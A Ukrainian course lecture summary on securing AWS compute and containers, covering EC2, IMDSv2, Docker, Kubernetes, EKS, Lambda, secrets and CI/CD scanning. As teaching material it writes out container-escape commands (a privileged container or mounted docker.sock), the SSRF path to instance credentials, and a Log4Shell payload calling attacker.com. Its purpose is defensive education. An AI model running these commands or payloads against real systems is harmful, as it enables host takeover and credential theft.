# Конспект лекції 6: Безпека обчислювальних сервісів і контейнерів

**Курс:** Інформаційна безпека телекомунікаційних та хмарних технологій  
**Модуль 2 — Лекція 6**

---

## 1. Огляд обчислювальних сервісів AWS

AWS надає кілька рівнів обчислювальних сервісів, кожен з яких має власну модель безпеки:

| Сервіс | Опис | Рівень управління |
|--------|------|-------------------|
| **EC2** | Класичні віртуальні машини | Повний контроль над ОС |
| **ECS** | Керований сервіс контейнерів | Контейнерний рівень |
| **EKS** | Керований Kubernetes | Pod / Node |
| **Fargate** | Serverless-контейнери | Тільки образ |
| **Lambda** | Serverless-функції | Тільки код |

**Ключовий принцип:** зі збільшенням рівня абстракції AWS бере більше відповідальності, але клієнт залишається відповідальним за код, конфігурацію та права доступу.

---

## 2. Модель спільної відповідальності для Compute

**AWS відповідає за (Security OF the Cloud):**
- Фізичну безпеку дата-центрів
- Гіпервізор та ізоляцію між клієнтами (EC2)
- Мережеву інфраструктуру AWS
- Управління платформою ECS/EKS Control Plane
- Патчі ядра Fargate-середовища та Lambda runtime

**Клієнт відповідає за (Security IN the Cloud):**
- Операційну систему EC2 — патчі, конфігурація, антивірус
- Security Groups та мережеві ACL
- Вміст та конфігурацію контейнерів
- IAM-ролі для сервісів (Execution Role, Task Role, IRSA)
- Шифрування даних у стані спокою (EBS, S3) і в русі (TLS)
- Код Lambda-функцій та залежності

> **Важливо:** Fargate та Lambda — AWS бере більше відповідальності, але клієнт досі відповідає за код і права доступу. Основні інциденти в хмарі відбуваються через неправильну конфігурацію, а не через вразливості AWS-інфраструктури.

---

## 3. Безпека Amazon EC2

### AMI (Amazon Machine Image)
AMI — шаблон для запуску EC2. Слід використовувати лише перевірені AMI:
- Офіційні образи AWS (Amazon Linux 2023, Ubuntu LTS)
- Образи з AWS Marketplace від перевірених вендорів
- Власні "golden AMI" з попереднім hardening-ом

**Аудит публічних AMI:** перевіряйте, хто є власником. Ніколи не використовуйте AMI без відомого власника.

### IMDSv2 (Instance Metadata Service v2)
IMDS — сервіс за адресою `169.254.169.254`, що надає EC2-інстансу дані про себе, включно з тимчасовими IAM-credentials.

**IMDSv1 (небезпечний):** запит без токена → будь-хто з доступом до HTTP може отримати credentials.  
**IMDSv2 (безпечний):** потрібен попередній PUT-запит для отримання сесійного токена:

```bash
# Крок 1: отримати токен
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Крок 2: використати токен
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Атака SSRF → IMDSv1:**
1. Зловмисник знаходить SSRF-вразливість у застосунку на EC2
2. Робить запит до `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
3. Отримує тимчасові AWS credentials
4. Використовує їх для доступу до S3, RDS, тощо

IMDSv2 значно ускладнює та знижує ризик цієї атаки (за умови, що SSRF-примітив не дозволяє виконувати довільні HTTP-методи та додавати власні заголовки).

**Примусове вмикання IMDSv2:**
```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx \
  --http-tokens required \
  --http-endpoint enabled
```

---

## 4. EC2: AWS Systems Manager та управління патчами

### Чому SSM замість SSH?
- Не потрібно відкривати порт 22 у Security Group
- Аудит сесій автоматично записується в S3/CloudWatch
- Не потрібно управляти SSH-ключами
- Доступ через IAM — можна відкликати миттєво

### SSM Session Manager
```bash
# Підключитись до інстансу без SSH
aws ssm start-session --target i-1234567890abcdef0

# Вимога: SSM Agent на інстансі + IAM роль AmazonSSMManagedInstanceCore
```

### Patch Manager
**Patch Baseline** визначає правила для автоматичного затвердження патчів:
- Critical: автозатвердження через 0 днів
- Important: через 7 днів
- CVSSScore >= 7: включати

**Maintenance Window** — заплановане вікно обслуговування (наприклад, вівторок 02:00–04:00) для застосування патчів без впливу на продуктивність.

**Рекомендація:** CRITICAL патчі застосовувати протягом 30 днів (NIST 800-190 вимога).

---

## 5. Мережева ізоляція: Security Groups та Network ACL

### Security Groups
- Діють на рівні мережевого інтерфейсу (ENI) — прикріплюються до EC2, RDS, ELB
- **Stateful**: якщо дозволений вхідний трафік — відповідь автоматично дозволяється
- Тільки правила **Allow** (немає Deny)
- Усі правила застосовуються одночасно

**Приклад мінімального SG для веб-сервера:**
```
Inbound:
  HTTPS (443) from 0.0.0.0/0
  HTTP (80) from 0.0.0.0/0 (для redirect)
Outbound:
  HTTPS (443) to 0.0.0.0/0 (для оновлень)
  Custom TCP (5432) to DB Security Group (PostgreSQL)
```

### Network ACL (NACL)
- Діють на рівні підмережі (subnet)
- **Stateless**: правила IN і OUT незалежні
- Підтримують **Deny**-правила (корисно для блокування IP)
- Правила виконуються у порядку номера (менший = вищий пріоритет)

### Defense in Depth
Принцип глибокого захисту для мережі AWS:
```
Internet → WAF → ALB (Public Subnet)
         → EC2 (Private Subnet) ← Security Group
         → RDS (Isolated Subnet) ← Security Group
         
VPC → Flow Logs → CloudWatch Logs
```

---

## 6. VPC: безпечна мережева архітектура

### Трирівнева архітектура
```
Public Subnet:   Load Balancer, NAT Gateway
                 (має маршрут до Internet Gateway)

Private Subnet:  EC2, ECS Tasks, EKS Nodes  
                 (маршрут до NAT Gateway для виходу)

Isolated Subnet: RDS, ElastiCache
                 (без маршруту до NAT/IGW)
```

### VPC Endpoints (PrivateLink)
Дозволяють EC2/Lambda/ECS/EKS звертатися до AWS API без виходу через інтернет.

- **Gateway Endpoint** (безкоштовно): S3, DynamoDB
- **Interface Endpoint** (платно): ECR, Secrets Manager, SSM, KMS, CloudWatch

Переваги:
- Трафік не покидає мережу AWS
- Знижує ризик MITM-атак
- Дозволяє повністю заблокувати outbound інтернет-трафік

---

## 7. Основи контейнеризації

### Що таке контейнер?
Контейнер — це ізольований процес Linux з власним:
- файловим простором (overlay filesystem)
- мережевим стеком
- деревом процесів (PID namespace)
- простором імен користувачів

**Принципова відмінність від VM:** контейнери використовують **спільне ядро** хост-системи. Якщо ядро скомпрометоване — всі контейнери під загрозою.

### Механізми ізоляції Linux

**Namespaces** — ізолюють ресурси:
- `pid` — ізоляція процесів (PID 1 у контейнері ≠ PID 1 на хості)
- `net` — ізоляція мережі (власний мережевий стек)
- `mnt` — ізоляція файлової системи
- `user` — ізоляція UID/GID
- `ipc` — ізоляція IPC

**cgroups** — обмежують ресурси:
- CPU: max 50% CPU хоста
- Memory: max 512MB RAM
- I/O: обмеження дискових операцій

**seccomp** — фільтрує системні виклики:
```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {"names": ["read","write","exit"], "action": "SCMP_ACT_ALLOW"}
  ]
}
```

**AppArmor/SELinux** — mandatory access control (MAC):
- Визначають, до яких файлів/мережевих ресурсів може звертатися процес
- Docker використовує профіль AppArmor за замовчуванням

---

## 8. Docker: архітектура та безпека

### Компоненти Docker
```
dockerd (daemon, root)
  └── containerd (runtime manager)
       └── runc (OCI runtime)
            └── container process
```

**Сокет `/var/run/docker.sock`** — найкритичніший елемент безпеки:
- Доступ до сокету = повний контроль над Docker daemon
- Docker daemon працює від root
- Монтування сокету в контейнер = root-доступ до хосту

### Запуск без root
```bash
# --user: запустити як конкретний UID:GID
docker run --user 1000:1000 nginx

# --read-only: read-only filesystem (+ tmpfs для /tmp)
docker run --read-only \
  --tmpfs /tmp nginx

# Видалити всі capabilities, додати лише потрібні
docker run --cap-drop ALL \
           --cap-add NET_BIND_SERVICE nginx
```

### Rootless Docker
Docker daemon може працювати без root-прав (rootless mode):
```bash
dockerd-rootless-setuptool.sh install
export DOCKER_HOST=unix://$XDG_RUNTIME_DIR/docker.sock
```

---

## 9. Безпечний Dockerfile

### Правила безпечного Dockerfile

1. **Конкретний тег базового образу** — не `latest`, а `python:3.12.3-slim`
2. **Non-root USER** — створити системного користувача, перемикнутись до нього
3. **Мінімальний базовий образ** — `alpine`, `slim`, `distroless`
4. **Секрети не в ENV** — використовувати Secrets Manager під час виконання
5. **.dockerignore** — виключити .git, .env, credentials
6. **COPY --chown** — правильні права на файли
7. **Multi-stage build** — зменшити розмір і поверхню атаки

### Приклад безпечного Dockerfile
```dockerfile
FROM python:3.12-slim AS base

RUN addgroup --system app && adduser --system --ingroup app app
WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY --chown=app:app . .
USER app
EXPOSE 8080
CMD ["python", "app.py"]
```

---

## 10. Multi-stage Build та .dockerignore

### Multi-stage Build
Дозволяє розділити образ збірки (з компіляторами, тестовими інструментами) та production-образ (мінімальний).

```dockerfile
# Stage 1: Build
FROM golang:1.22-alpine AS builder
WORKDIR /src
COPY . .
RUN go build -o /app ./cmd/server

# Stage 2: Production (distroless — немає shell, package manager)
FROM gcr.io/distroless/static-debian12
COPY --from=builder /app /app
USER nonroot:nonroot
ENTRYPOINT ["/app"]
```

**Результат:** production-образ без Go-компілятора, Alpine-пакетів, тощо. Розмір зменшується з ~400MB до ~10MB.

### .dockerignore
```
.git                # git-history може містити старі секрети
.env                # змінні середовища з паролями
secrets/            # папки з ключами
*.key *.pem         # сертифікати та ключі
node_modules/       # зайві залежності
__pycache__/        # Python кеш
tests/ docs/        # не потрібні в production
```

> **Небезпека без .dockerignore:** команда `COPY . .` у Dockerfile копіює весь build context, включно з .git (що може містити давно видалені секрети), .env, ssh-ключі.

---

## 11. Сканування вразливостей Docker-образів

### Trivy
```bash
# Сканування образу
trivy image python:3.12-slim

# Тільки HIGH та CRITICAL, вивід у JSON
trivy image --severity HIGH,CRITICAL \
  --format json myapp:latest > report.json

# Сканування Dockerfile (IaC)
trivy config --severity HIGH ./Dockerfile
```

### Де сканувати в pipeline?
```
Developer commit
    → CI: git-secrets (check for credentials)
    → CI: Hadolint (Dockerfile lint)
    → CI: docker build
    → CI: Trivy scan → SARIF → GitHub Security
    → if CRITICAL: FAIL pipeline
    → Push to ECR (якщо OK)
    → ECR: Enhanced Scanning (Amazon Inspector)
    → Deploy
```

### Amazon ECR Enhanced Scanning
- Використовує Amazon Inspector
- Безперервне сканування (не тільки при push)
- Сповіщення через EventBridge при нових CVE
- Результати у Security Hub

---

## 12. SBOM та Image Signing

### SBOM (Software Bill of Materials)
SBOM — машиночитаний перелік всіх компонентів ПЗ: пакети ОС, бібліотеки, їх версії та ліцензії.

**Навіщо потрібен:**
- Швидкий пошук вразливих компонентів (Log4Shell: чи є Log4j у наших образах?)
- Аудит ліцензій (GPL, MIT, Apache)
- Вимога регуляторів (NIST EO 14028 для держ. ПЗ США)

```bash
# Syft — генерація SBOM у форматі CycloneDX
syft myapp:latest -o cyclonedx-json > sbom.json

# Grype — перевірка SBOM на вразливості
grype sbom:sbom.json --only-fixed
```

### cosign (Image Signing)
Дозволяє підписати образ після збірки та верифікувати підпис перед деплоєм:

```bash
# Генерація ключів
cosign generate-key-pair

# Підписати образ (зберігає підпис в ECR поруч з образом)
cosign sign --key cosign.key 123.dkr.ecr.region.amazonaws.com/app:v1

# Верифікація (вбудований у Admission Controller)
cosign verify --key cosign.pub 123.dkr.ecr.region.amazonaws.com/app:v1
```

---

## 13. DevSecOps CI/CD Pipeline

### "Shift Left Security" — принцип
Чим раніше виявляється вразливість — тим дешевше її виправити:
- На етапі коду: ~$1
- На етапі збірки: ~$10
- В production: ~$1000+

### Рівні перевірки безпеки в CI/CD
1. **Pre-commit hooks:** `git-secrets`, `gitleaks` — пошук секретів у коді
2. **Lint:** `Hadolint` — аналіз Dockerfile на best practices
3. **Build:** `docker build`
4. **Scan:** `Trivy`, `Snyk` — CVE в образі та залежностях
5. **Sign:** `cosign` — підписання образу
6. **Push:** ECR (тільки при успішному скануванні)
7. **Deploy:** Admission Controllers (OPA/Kyverno) перевіряють образ
8. **Runtime:** Falco, GuardDuty — поведінкові аномалії

---

## 14. Kubernetes: архітектура та RBAC

### Control Plane компоненти
- **kube-apiserver** — точка входу для всіх операцій, автентифікація/авторизація
- **etcd** — розподілене сховище стану кластера. **Шифрувати обов'язково!**
- **kube-scheduler** — розподіляє Pods по вузлах
- **controller-manager** — забезпечує бажаний стан (Deployment, ReplicaSet)

### Автентифікація в K8s
- **Сертифікати X.509** — для системних компонентів
- **Service Account токени** — для Pod-ів
- **OIDC** — для інтеграції з корпоративними IdP
- **AWS IAM → IRSA** — для EKS (найбезпечніший варіант)

### RBAC — Role-Based Access Control
```yaml
# Role — дозволи в межах namespace
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
  namespace: production
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list", "watch"]   # Тільки читання

---
# RoleBinding — прив'язати Role до ServiceAccount
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods-binding
subjects:
- kind: ServiceAccount
  name: myapp-sa
  namespace: production
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
```

**ClusterRole/ClusterRoleBinding** — діють на рівні всього кластера.

---

## 15. Pod Security Standards та Network Policies

### Pod Security Standards (PSS)
PSS — вбудований механізм K8s (v1.25+) для обмеження конфігурації Pod-ів.

| Профіль | Що обмежує |
|---------|-----------|
| **Privileged** | Без обмежень — для системних компонентів |
| **Baseline** | Блокує privileged, hostNetwork, hostPID |
| **Restricted** | Non-root, read-only FS, drop all capabilities |

```bash
# Застосувати Restricted до namespace production
kubectl label namespace production \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/enforce-version=latest
```

### Network Policies
За замовчуванням K8s дозволяє **весь трафік між усіма Pod-ами**. NetworkPolicy змінює це.

```yaml
# Default deny all (обов'язково!)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}    # Застосовується до всіх Pod-ів
  policyTypes:
  - Ingress
  - Egress

---
# Дозволити: frontend → backend:8080
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
spec:
  podSelector:
    matchLabels:
      app: backend
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - port: 8080
```

> **Важливо:** NetworkPolicy потребує CNI-плагіну з підтримкою (Calico, Cilium, AWS VPC CNI). Стандартний kubenet не підтримує.

---

## 16. Kubernetes Admission Controllers

### Що це?
Admission Controllers — це плагіни kube-apiserver, що перехоплюють запити після автентифікації/авторизації, але до збереження в etcd. Можуть:
- **Validating**: відхилити небезпечний запит
- **Mutating**: автоматично виправити конфігурацію

### OPA Gatekeeper
Open Policy Agent + Kubernetes-інтеграція. Мова правил — Rego.

```yaml
# ConstraintTemplate — шаблон правила
# K8sDisallowedTags — заборонити конкретні теги образів
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sDisallowedTags
metadata:
  name: no-latest-tag
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
  parameters:
    tags: ["latest"]
```

### Kyverno
K8s-нативна альтернатива OPA. Простіший синтаксис (YAML, не Rego).

```yaml
# Автоматично додавати securityContext (Mutating)
- name: add-security-context
  mutate:
    patchStrategicMerge:
      spec:
        securityContext:
          runAsNonRoot: true
          runAsUser: 1000
```

---

## 17. Kubernetes Secrets: шифрування

### Проблема
K8s Secrets зберігаються в etcd у **base64**:
```bash
kubectl get secret db-credentials -o yaml
# data:
#   password: c2VjcmV0MTIz   ← base64 від "secret123"
```

Будь-хто з `kubectl get secret` або доступом до etcd — має всі секрети у відкритому вигляді.

### Envelope Encryption через KMS (EKS)
```bash
# Увімкнути шифрування etcd через AWS KMS
aws eks associate-encryption-config \
  --cluster-name my-cluster \
  --encryption-config '[{
    "resources": ["secrets"],
    "provider": {
      "keyArn": "arn:aws:kms:eu-west-1:123:key/abc-def"
    }
  }]'
```

### External Secrets Operator
Кращий підхід: **секрети взагалі не зберігати в etcd**.

```yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: my-db-secret
spec:
  refreshInterval: 1h           # Оновлювати кожну годину
  secretStoreRef:
    name: aws-secrets-manager
    kind: ClusterSecretStore
  target:
    name: my-db-k8s-secret      # Ім'я K8s Secret
  data:
  - secretKey: password         # Ключ у K8s Secret
    remoteRef:
      key: prod/myapp/database  # Ключ у AWS Secrets Manager
      property: password
```

---

## 18. Amazon EKS: безпека

### Що управляє AWS в EKS
- Control Plane (kube-apiserver, etcd, scheduler)
- Патчі та оновлення Control Plane
- Multi-AZ розгортання Control Plane
- Шифрування etcd за замовчуванням

### IRSA (IAM Roles for Service Accounts)
Дозволяє Pod-у отримати тимчасові IAM credentials через Web Identity Federation.

```bash
# Створити Service Account з IAM роллю
eksctl create iamserviceaccount \
  --name s3-reader \
  --namespace production \
  --cluster my-cluster \
  --attach-policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess \
  --approve

# Pod автоматично отримує env vars:
# AWS_ROLE_ARN, AWS_WEB_IDENTITY_TOKEN_FILE
# AWS SDK автоматично використовує IRSA credentials
```

### Безпека Control Plane endpoint
```bash
# Тільки приватний endpoint (без публічного)
aws eks update-cluster-config \
  --name my-cluster \
  --resources-vpc-config \
    endpointPublicAccess=false,\
    endpointPrivateAccess=true
```

---

## 19. EKS: безпека вузлів та Bottlerocket

### Bottlerocket OS
Спеціалізована ОС AWS для контейнерних робочих навантажень:

| Характеристика | Bottlerocket | Amazon Linux 2023 |
|---------------|--------------|-------------------|
| Shell | Немає (за замовчуванням) | bash |
| Root FS | Read-only | Read-write |
| Оновлення | Атомарні (A/B partitions) | Traditional |
| dm-verity | Так | Ні |
| SELinux | Увімкнено | Опціонально |

### Node IAM Role — мінімальні права
```json
{
  "Effect": "Allow",
  "Action": [
    "ec2:DescribeInstances",
    "ecr:GetAuthorizationToken",
    "ecr:BatchCheckLayerAvailability",
    "ecr:GetDownloadUrlForLayer",
    "ecr:BatchGetImage",
    "logs:CreateLogStream",
    "logs:PutLogEvents"
  ]
}
```

---

## 20. Amazon ECS та AWS Fargate

### ECS компоненти
- **Task Definition** — JSON/YAML конфігурація (образ, CPU, RAM, мережа, секрети)
- **Task** — запущений екземпляр Task Definition
- **Service** — підтримує N запущених Tasks, health checks, rolling updates
- **Cluster** — логічна група Tasks/Services

### Безпека Task Definition
```json
{
  "containerDefinitions": [{
    "name": "myapp",
    "image": "123.dkr.ecr.region.amazonaws.com/app:v1",
    "readonlyRootFilesystem": true,
    "user": "1000:1000",
    "linuxParameters": {
      "capabilities": {"drop": ["ALL"]}
    },
    "secrets": [{
      "name": "DB_PASSWORD",
      "valueFrom": "arn:aws:secretsmanager:region:123:secret:prod/db/pass"
    }],
    "logConfiguration": {
      "logDriver": "awslogs",
      "options": {
        "awslogs-group": "/ecs/myapp",
        "awslogs-region": "eu-west-1"
      }
    }
  }]
}
```

### Fargate — модель безпеки
- AWS управляє хост-ОС та ядром
- Кожна Task має власний мікро-VM (Firecracker) — сильна ізоляція
- Клієнт не має доступу до хост-ОС
- AWS патчить середовище без участі клієнта

---

## 21. Serverless безпека: AWS Lambda

### Модель виконання
Lambda виконується у **Firecracker MicroVM** — легкий гіпервізор від AWS:
- Кожне виконання (або "warm" instance) — ізольований MicroVM
- Cold start — нова ізольована VM (~100ms–1s)
- Warm start — повторне використання існуючого MicroVM

### Ключові ризики
1. **Event injection** — вхідні дані Lambda передаються через event (JSON). Якщо не валідувати → SQL injection, command injection, тощо
2. **Надмірні права Execution Role** — принцип найменших привілеїв обов'язковий
3. **Секрети в env vars** — відображаються у консолі AWS, в логах
4. **Уразливі залежності** — pip/npm пакети можуть мати CVE
5. **Event injection через SQS/SNS/S3** — непрямі тригери теж несуть ризик

### Безпечна Lambda
```python
import boto3
import re

def handler(event, context):
    # 1. Валідація вхідних даних
    user_id = event.get("userId", "")
    if not re.match(r'^[a-zA-Z0-9_-]{3,50}$', user_id):
        return {"statusCode": 400, "body": "Invalid userId"}
    
    # 2. Секрети через Secrets Manager, не env vars
    client = boto3.client('secretsmanager')
    secret = client.get_secret_value(
        SecretId='prod/myapp/db'
    )['SecretString']
    
    # 3. Логування без секретів
    print(f"Processing user: {user_id}")
    # НЕ: print(f"DB password: {secret}")
    
    return {"statusCode": 200}
```

---

## 22. Lambda: VPC та Resource-based Policy

### Lambda без VPC (за замовчуванням)
- Доступ до публічних AWS API (S3, DynamoDB) через публічні endpoints
- Є вихід в інтернет
- **Немає** доступу до приватних ресурсів VPC (RDS у private subnet)

### Lambda у VPC
```
Lambda → ENI у Private Subnet → RDS, ElastiCache
Lambda → NAT Gateway → Internet (для зовнішніх API)
Lambda → VPC Endpoint → AWS API (без інтернету)
```

### Resource-based Policy (Function Policy)
Визначає, **хто** може викликати Lambda:
```json
{
  "Effect": "Allow",
  "Principal": {"Service": "apigateway.amazonaws.com"},
  "Action": "lambda:InvokeFunction",
  "Condition": {
    "ArnLike": {
      "AWS:SourceArn": "arn:aws:execute-api:region:123:api-id/*/GET/users"
    }
  }
}
```
Обмеження `SourceArn` захищає від "confused deputy" атаки.

---

## 23. Управління секретами

### AWS Secrets Manager
- Зберігання: JSON-структуровані або рядкові секрети
- **Автоматична ротація** для RDS, Redshift, DocumentDB — Lambda-функція ротує пароль без downtime
- Версіонування: `AWSCURRENT`, `AWSPREVIOUS`, кастомні staging labels
- Тонкий IAM контроль: хто може читати/оновлювати який секрет
- Аудит через CloudTrail

### SSM Parameter Store
- Безкоштовний для Standard tier (до 10 000 параметрів)
- **SecureString** = зашифровано KMS
- Ієрархічна структура: `/prod/myapp/db/password`
- Підходить для: конфігурацій, feature flags + секретів

### Де НЕ зберігати секрети
| Місце | Чому небезпечно |
|-------|-----------------|
| `ENV DB_PASSWORD=...` у Dockerfile | `docker history` показує всі шари, включно з ENV |
| Git repo (навіть видалений commit) | `git log --all` + `git show` — секрет залишається назавжди |
| CloudWatch logs | Всі з правом читання логів мають секрет |
| EC2 user-data | Доступно через IMDS без автентифікації (IMDSv1) |
| K8s ConfigMap | Незашифровані, видно через `kubectl get configmap -o yaml` |

---

## 24. IaC Security: Checkov та tfsec

### Типові помилки IaC
```hcl
# ПОГАНО — відкритий SSH для всього інтернету
resource "aws_security_group_rule" "ssh" {
  cidr_blocks = ["0.0.0.0/0"]  # Порушення CKV_AWS_24
  from_port   = 22
}

# ПОГАНО — незашифровані EBS томи
resource "aws_instance" "web" {
  root_block_device {
    encrypted = false  # Порушення CKV_AWS_8
  }
}
```

### Checkov сканування
```bash
# Сканування всіх TF файлів
checkov -d ./terraform --framework terraform

# Тільки HIGH/CRITICAL
checkov -d . --check CKV_AWS_8,CKV_AWS_24

# Вивід у SARIF для GitHub
checkov -d . --output sarif --output-file-path results.sarif
```

---

## 25. Типові атаки на контейнерні середовища

### Container Escape
**Вектор 1: Privileged Container**
```bash
docker run --privileged ubuntu bash
# Всередині контейнера:
fdisk -l                        # Бачимо всі диски хоста
mkdir /mnt/host && mount /dev/xvda1 /mnt/host
chroot /mnt/host                # Тепер маємо root на хості!
```

**Вектор 2: Монтування docker.sock**
```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu
# Всередині — повний контроль над Docker daemon:
docker run --privileged -v /:/mnt ubuntu chroot /mnt
```

**Захист:**
- Ніколи `--privileged` у production
- Не монтувати docker.sock
- PSS Restricted profile
- seccomp/AppArmor profiles
- Kata Containers або gVisor для додаткової ізоляції

### SSRF → IMDS
```
User request → App Server (EC2) → SSRF vulnerability
                                → GET http://169.254.169.254/latest/meta-data/
                                → IAM Role credentials
                                → Attacker uses credentials
```
**Захист:** IMDSv2 — вимагає PUT-запит для токена (SSRF зазвичай не може зробити PUT).

---

## 26. Supply Chain Attacks: Log4Shell

### CVE-2021-44228 (Log4Shell)
**Що трапилось:**
- Log4j 2.x (популярний Java-логгер) вразливий до RCE через JNDI lookup
- Будь-який рядок, що проходить через логгер, виконується як JNDI-запит
- Атакуючий надсилає `${jndi:ldap://attacker.com/a}` в HTTP-заголовку, username, тощо

**Чому масштаб такий великий:**
- Log4j — транзитивна залежність у тисячах Java-застосунків
- Більшість команд не знала, що у них є Log4j
- SBOM допоміг би знайти і виправити за години, а не тижні

### SLSA Framework (Supply-chain Levels for Software Artifacts)
| Рівень | Вимога |
|--------|--------|
| L1 | Документований процес збірки |
| L2 | Верифікований збудовувач |
| L3 | Ізольоване середовище збірки, підпис |
| L4 | Відтворювана збірка (hermetic) |

---

## 27. Моніторинг та Falco

### AWS GuardDuty для Compute
- **EC2:** виявлення криптомайнінгу, порт-сканів, незвичного трафіку
- **EKS:** виявлення аномальних API-викликів, privilege escalation, container escape
- **Lambda:** незвична активність, виклики з аномальних джерел

### Falco — Runtime Security
Falco — CNCF open-source проект для виявлення аномальної поведінки в контейнерах:

```yaml
# Правило: shell запущено в production контейнері
- rule: Terminal shell in container
  desc: A shell was spawned in a container
  condition: >
    container.id != host and
    proc.name in (bash, sh, zsh, fish) and
    proc.tty != 0 and
    not container.image.repository in (approved_images)
  output: >
    Shell spawned in container
    (user=%user.name container=%container.name
     image=%container.image.repository)
  priority: WARNING
  tags: [container, shell, mitre_execution]
```

---

## 28. Incident Response для контейнерів

### Відмінності від традиційного IR

| Аспект | Традиційний IR | Контейнерний IR |
|--------|----------------|-----------------|
| Persistence | Система довгоживуча | Контейнер ефемерний |
| Патч | Виправити на місці | Перерозгорнути новий образ |
| Логи | Локальні файли | Централізовані (CloudWatch, S3) |
| Forensics | Disk image | Container snapshot + event logs |

### Workflow реагування
1. **Виявлення** — GuardDuty / Falco alert
2. **Ізоляція** — `kubectl label pod <pod> quarantine=true` + NetworkPolicy
3. **Збереження** — `docker export`, `kubectl debug`, memory dump
4. **Аналіз** — перевірити processes, network connections, файлову систему
5. **Remediation** — оновити образ, перерозгорнути, ротувати credentials
6. **Post-mortem** — timeline, root cause, prevention

---

## 29. Zero Trust для хмарних обчислювальних середовищ

### Принципи Zero Trust
1. **Verify explicitly** — завжди перевіряй identity, не довіряй на основі мережі
2. **Least privilege** — мінімальні права для кожного суб'єкта та транзакції
3. **Assume breach** — проектуй як якщо зловмисник вже всередині

### Service Mesh (Istio)
Service Mesh реалізує Zero Trust для мікросервісів:

```
Service A → (mTLS) → Service B
     ↑                    ↑
cert-manager         cert-manager
(автоматична         (автоматична
ротація)             ротація)

AuthorizationPolicy: тільки A може говорити з B
```

### AWS Verified Access
AWS-нативне рішення Zero Trust для внутрішніх застосунків:
- Замінює VPN
- Перевіряє identity (IAM Identity Center / OIDC) та device posture
- Кожен запит логується

---

## 30. CIS Benchmarks та Compliance

### CIS Docker Benchmark — ключові перевірки
```bash
# docker-bench-security
docker run --rm \
  -v /var/run/docker.sock:/var/run/docker.sock \
  docker/docker-bench-security

# Перевіряє:
# 1.1 Ensure a separate partition for containers
# 2.1 Ensure network traffic is restricted between containers
# 4.1 Ensure image is not running as root
# 5.1 Ensure AppArmor Profile is Applied
```

### NIST SP 800-190 — Container Security Guide
Основні рекомендації:
- Сканування образів перед деплоєм
- Мінімальні базові образи
- Non-root виконання
- Read-only файлова система
- Secrets management

### AWS Security Hub — Foundational Security Standard
Автоматично перевіряє:
- EKS control plane logging
- EC2 IMDSv2 використання
- ECR image scanning увімкнено
- Lambda execution role permissions
- ECS задачі без privileged mode

---

## Ключові висновки

1. **Shared Responsibility** залежить від рівня сервісу: EC2 (найбільше відповідальності клієнта) → Lambda (найменше)
2. **IMDSv2** є обов'язковим для захисту IAM credentials від SSRF
3. **Non-root + read-only FS + drop capabilities** — базовий мінімум безпеки контейнера
4. **Multi-stage build + .dockerignore** — зменшити поверхню атаки образу
5. **SBOM + Image Signing** — захист від supply chain атак
6. **IRSA / Task Role** — ніяких статичних ключів у контейнерах
7. **Network Policy (default deny)** + **Service Mesh mTLS** — Zero Trust мережева безпека
8. **Secrets Manager / External Secrets** — секрети поза etcd та образами
9. **Shift Left** — безпека в CI/CD pipeline, а не тільки в production
10. **Ефемерність** контейнерів вимагає централізованих логів та forensic-готовності
